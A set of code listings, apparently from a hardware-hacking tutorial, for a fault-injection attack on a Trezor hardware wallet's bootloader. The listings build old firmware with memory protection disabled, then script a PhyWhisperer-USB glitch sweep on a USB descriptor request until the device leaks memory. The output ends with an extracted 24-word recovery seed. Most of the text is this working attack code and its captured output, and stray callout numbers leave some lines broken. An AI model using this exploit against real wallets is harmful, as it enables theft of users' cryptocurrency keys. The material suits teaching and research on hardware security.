["```\n`--snip--`\n#define FLASH_BOOT_START     (FLASH_ORIGIN)\n#define FLASH_BOOT_LEN       (0x8000)\n\n#define FLASH_META_START     (FLASH_BOOT_START + FLASH_BOOT_LEN)\n#define FLASH_META_LEN       (0x8000)\n\n#define FLASH_APP_START      (FLASH_META_START + FLASH_META_LEN)\n`--snip--`\n```", "```\nstatic int winusb_control_vendor_request(usbd_device *usbd_dev,\n                                   struct usb_setup_data *req,\n                                   uint8_t **buf, uint16_t *len,\n                                   usbd_control_complete_callback* complete) {\n  (void)complete;\n  (void)usbd_dev;\n\n  if (req->bRequest != WINUSB_MS_VENDOR_CODE) {\n    return USBD_REQ_NEXT_CALLBACK;\n  }\n\n  int status = USBD_REQ_NOTSUPP;\n  if (((req->bmRequestType & USB_REQ_TYPE_RECIPIENT) == USB_REQ_TYPE_DEVICE) &&\n     (req->wIndex == WINUSB_REQ_GET_COMPATIBLE_ID_FEATURE_DESCRIPTOR))\n  {\n       *buf = (uint8_t*)(&winusb_wcid);\n       *len = MIN(*len, winusb_wcid.header.dwLength);\n       status = USBD_REQ_HANDLED;\n\n  } else if (((req->bmRequestType & USB_REQ_TYPE_RECIPIENT) ==\n             USB_REQ_TYPE_INTERFACE) &&\n       (req->wIndex == WINUSB_REQ_GET_EXTENDED_PROPERTIES_OS_FEATURE_DESCRIPTOR)\n      && (usb_descriptor_index(req->wValue) ==\n          winusb_wcid.functions[0].bInterfaceNumber))\n  {\n        *buf = (uint8_t*)(&guid);\n      1 *len = MIN(*len, guid.header.dwLength);\n        status = USBD_REQ_HANDLED;\n\n } else {\n        status = USBD_REQ_NOTSUPP;\n  }\n\n  return status;\n}\n```", "```\njump:jump_to_firmware(const vector_table_t *ivt, int trust) {\n  if (FW_SIGNED == trust) {    // trusted signed firmware\n    SCB_VTOR = (uint32_t)ivt;  // * relocate vector table\n    // Set stack pointer\n    __asm__ volatile(\"msr msp, %0\" ::\"r\"(ivt->initial_sp_value));\n  } else {  // untrusted firmware\n    timer_init();\n    mpu_config_firmware();  // * configure MPU for the firmware\n    __asm__ volatile(\"msr msp, %0\" ::\"r\"(_stack));\n  }\n```", "```\n**sudo apt install git make gcc-arm-none-eabi protobuf-compiler python3 python3-pip**\n**git clone --recursive https://github.com/trezor/trezor-mcu.git**\n**cd trezor-mcu**\n**git checkout v1.7.3**\n**make vendor**\n**make -C vendor/nanopb/generator/proto**\n**make -C vendor/libopencm3 lib/stm32/f2**\n**make MEMORY_PROTECT=0 && make -C bootloader align MEMORY_PROTECT=0**\n```", "```\nimport usb.core\nimport time\n\ndev = usb.core.find(idProduct=0x53c0)\ndev.set_configuration()\n\n#Get WinUSB GUID structure\nresp = dev.ctrl_transfer(0xC1, 0x21, wValue=0, wIndex=0x05, data_or_wLength=0x1ff)\nresp = list(resp)\n\nprint(len(resp))\n```", "```\nimport phywhisperer.usb as pw\nimport time\nphy = pw.Usb()\nphy.con()\nphy.set_power_source(\"off\")\ntime.sleep(0.5)\nphy.reset_fpga()\nphy.set_power_source(\"host\")\n#Let device enumerate\ntime.sleep(1.0)\n```", "```\n#Configure pattern for request we want, arm\nphy.set_pattern(pattern=[0xC1, 0x21], mask=[0xff, 0xff])\nphy.set_trigger(delays=[0])\nphy.arm()\n```", "```\nraw = phy.read_capture_data()\nphy.addpattern = True\npackets = phy.split_packets(raw)\nphy.print_packets(packets)\n```", "```\n[      ]   0.000000 d=  0.000000 [   .0 +  0.017] [ 10] Err - bad PID of 01\n[      ]   0.000006 d=  0.000006 [   .0 +  5.933] [  1] ACK\n[      ]   0.000013 d=  0.000007 [   .0 + 12.933] [  3] IN   : 41.0\n[      ]   0.000016 d=  0.000003 [   .0 + 16.350] [ 67] DATA1: 92 00 00 00 00 01 05 00 01 00 88 00 00 00 07 00 00 00 2a 00 44 00 65 00 76 00 69 00 63 00 65 00 49 00 6e 00 74 00 65 00 72 00 66 00 61 00 63 00 65 00 47 00 55 00 49 00 44 00 73 00 00 00 50 00 52 11\n[      ]   0.000062 d=  0.000046 [   .0 + 62.350] [  1] ACK\n[      ]   0.000064 d=  0.000002 [   .0 + 64.267] [  3] IN   : 41.0\n[      ]   0.000068 d=  0.000003 [   .0 + 67.600] [ 67] DATA0: 00 00 7b 00 30 00 32 00 36 00 33 00 62 00 35 00 31 00 32 00 2d 00 38 00 38 00 63 00 62 00 2d 00 34 00 31 00 33 00 36 00 2d 00 39 00 36 00 31 00 33 00 2d 00 35 00 63 00 38 00 65 00 31 00 30 00 2d a6\n[      ]   0.000114 d=  0.000046 [   .0 +113.600] [  1] ACK\n[      ]   0.000149 d=  0.000036 [168   +  3.250] [  3] IN   : 41.0\n[      ]   0.000153 d=  0.000003 [168   +  6.667] [ 21] DATA1: 39 00 64 00 38 00 65 00 66 00 35 00 7d 00 00 00 00 00 e7 b2\n[      ]   0.000168 d=  0.000015 [168   + 22.000] [  1] ACK\n[      ]   0.000174 d=  0.000006 [168   + 28.000] [  3] OUT  : 41.0\n[      ]   0.000177 d=  0.000003 [168   + 31.250] [  3] DATA1: 00 00\n[      ]   0.000181 d=  0.000003 [168   + 34.500] [  1] ACK\n```", "```\n//Add this at top of winusb.c\n#include <libopencm3/stm32/gpio.h>\n\n//Somewhere we want to make a trigger:\ngpio_mode_setup(GPIOB, GPIO_MODE_OUTPUT, GPIO_PUPD_NONE, GPIO3);\ngpio_set(GPIOB, GPIO3);\ngpio_clear(GPIOB, GPIO3);\n```", "```\n#PhyWhisperer-USB Setup\nimport time\nimport usb.core\nimport phywhisperer.usb as pw\nphy = pw.Usb()\nphy.con()\n\ndelay_start = phy.us_trigger(1.0) # Start at 1us from trigger\ndelay_end = phy.us_trigger(5.5) # Sweep to 5.5us from trigger\n\ndelay = delay_start\ngo = True\n\ngolden_valid = False\n\n#Re-init power cycles the target when itâ€™s fully crashed\n1 def reinit():\n    phy.set_power_source(\"off\") \n    time.sleep(0.25)\n    phy.reset_fpga()\n    phy.set_capture_size(500)\n    phy.set_power_source(\"host\")\n    time.sleep(0.8)\n\nfails = 0\n```", "```\nwhile go:\n    if delay > delay_end:\n        print(\"New Loop Entered\")\n        delay = delay_start\n\n    #Re-init on first run through (golden_valid is False) or if a number of fails\n    if golden_valid is False or fails > 10:\n        reinit()\n        fails = 0\n    phy.set_trigger(delays=[delay], widths=[12]) #12 is width of EMFI pulse 1\n    phy.set_pattern(pattern=[0xC1, 0x21]) 2\n    dev = None\n\n    try:\n        dev = usb.core.find(idProduct=0x53c0)\n        dev.set_configuration() 3\n    except:\n        #If we fail multiple times, eventually triggers DUT power cycle\n        fails += 1\n        continue\n\n    #Glitch only once we've recorded the 'golden sample' of expected output\n    if golden_valid is True:\n        phy.arm() 4\n    time.sleep(0.1)\n\n    resp = [0]\n    try:\n        resp = dev.ctrl_transfer(0xC1, 0x21, wValue=0, wIndex=0x05, data_or_wLength=0x1ff) 5\n        resp = list(resp)\n\n        if golden_valid is False:\n            gold = resp[:] 6\n            golden_valid = True\n\n        if resp != gold:\n            #Odd (but valid!) response\n            print(\"Delay: %d\"%delay)\n            print(\"Length: %d\"%len(resp))\n            print(\"[\", \", \".join(\"{:02x}\".format(num) for num in resp), \"]\")\n            raw = phy.read_capture_data() 7\n            phy.addpattern = True\n            packets = phy.split_packets(raw)\n            phy.print_packets(packets)\n if len(resp) > 146:\n            #Too-long response is desired result\n            print(len(resp))\n            go = False\n            break\n\n    except OSError: 8\n        #OSError catches USBError, normally means device crashed\n        reinit()\n\n    delay += 1\n\n    if (delay % 10) == 0:\n        print(delay)\n```", "```\nLength: 146\n[ 92, 00, 00, 00, 00, 01, 05, 00, 01, 00, 88, 00, 00, 00, 07, 00, 00, 00, 2a, 00, 44, 00, 65, 00, 76, 00, 69, 00, 63, 00, 65, 00, 49, 00, 6e, 00, 74, 00, 65, 00, 72, 00, 66, 00, 61, 00, 63, 00, 65, 00, 47, 00, 55, 00, 49, 00, 44, 00, 73, 00, 00, 00, 50, 00, 00, 00, 7b, 00, 30, 00, 32, 00, 36, 00, 33, 00, 62, 00, 35, 00, 31, 00, 32, 00, 2d, 00, 38, 00, 38, 00, 63, 00, 62, 00, 2d, 00, 34, 00, 31, 00, 33, 00, 36, 00, 2d, 00, 39, 00, 36, 00, 31, 00, 33, 00, 2d, 00, 35, 00, 63, 00, 38, 00, 65, 00, 31, 00, 30, 00, 39, 00, 64, 00, 38, 00, 65, 00, 66, 00, 35, 00, 7d, 00, 00, 00, 00, 00 ]\n```", "```\nDelay: 1293\nLength: 82\n1 [ 00, 00, 7b, 00, 30, 00, 32, 00, 36, 00, 33, 00, 62, 00, 35, 00, 31, 00, 32, \n00, 2d, 00, 38, 00, 38, 00, 63, 00, 62, 00, 2d, 00, 34, 00, 31, 00, 33, 00, 36, 00, 2d, 00, 39, 00, 36, 00, 31, 00, 33, 00, 2d, 00, 35, 00, 63, 00, 38, 00, 65, 00, 31, 00, 30, 00, 39, 00, 64, 00, 38, 00, 65, 00, 66, 00, 35, 00, 7d, 00, 00, 00, 00, 00 ]\n[      ]   0.000000 d=  0.000000 [   .0 +  0.017] [  3] Err - bad PID of 01\n[      ]   0.000001 d=  0.000001 [   .0 +  1.200] [  1] ACK\n[      ]   0.000029 d=  0.000028 [186   +  3.417] [  3] IN   : 6.0\n[      ]   0.000032 d=  0.000003 [186   +  6.750] [ 67] DATA0: 92 00 00 00 00 01 05 00 01 00 88 00 00 00 07 00 00 00 2a 00 44 00 65 00 76 00 69 00 63 00 65 00 49 00 6e 00 74 00 65 00 72 00 66 00 61 00 63 00 65 00 47 00 55 00 49 00 44 00 73 00 00 00 50 00 52 11\n[      ]   0.000078 d=  0.000046 [186   + 53.000] [  1] ACK\n[      ]   0.000087 d=  0.000008 [186   + 61.417] [  3] IN   : 6.0\n[      ]   0.000090 d=  0.000003 [186   + 64.750] [ 67] DATA1: 00 00 7b 00 30 00 32 00 36 00 33 00 62 00 35 00 31 00 32 00 2d 00 38 00 38 00 63 00 62 00 2d 00 34 00 31 00 33 00 36 00 2d 00 39 00 36 00 31 00 33 00 2d 00 35 00 63 00 38 00 65 00 31 00 30 00 2d a6\n[      ]   0.000136 d=  0.000046 [186   +110.917] [  1] ACK\n[      ]   0.000156 d=  0.000019 [186   +130.167] [  3] IN   : 6.0\n[      ]   0.000159 d=  0.000003 [186   +133.500] [ 21] DATA0: 39 00 64 00 38 00 65 00 66 00 35 00 7d 00 00 00 00 00 e7 b2\n[      ]   0.000174 d=  0.000016 [186   +149.000] [  1] ACK\n[      ]   0.000183 d=  0.000009 [186   +157.583] [  3] OUT  : 6.0\n[      ]   0.000186 d=  0.000003 [186   +161.000] [  3] DATA1: 00 00\n[      ]   0.000190 d=  0.000003 [186   +164.250] [  1] ACK\n```", "```\nimport re\nre.findall(b\"([a-zA-Z ]{4,})\", bytearray(resp))\n```", "```\n[b'WINUSB',\n b'TRZR',\n b'stor',\n b'exercise muscle tone skate lizard trigger hospital weapon volcano rigid veteran elite speak outer place logic old abandon aspect ski spare victory blast language',\n b'My Trezor',\n b'FjFS',\n b'XhYF',\n b'JFAF',\n b'FHDMD',\n```"]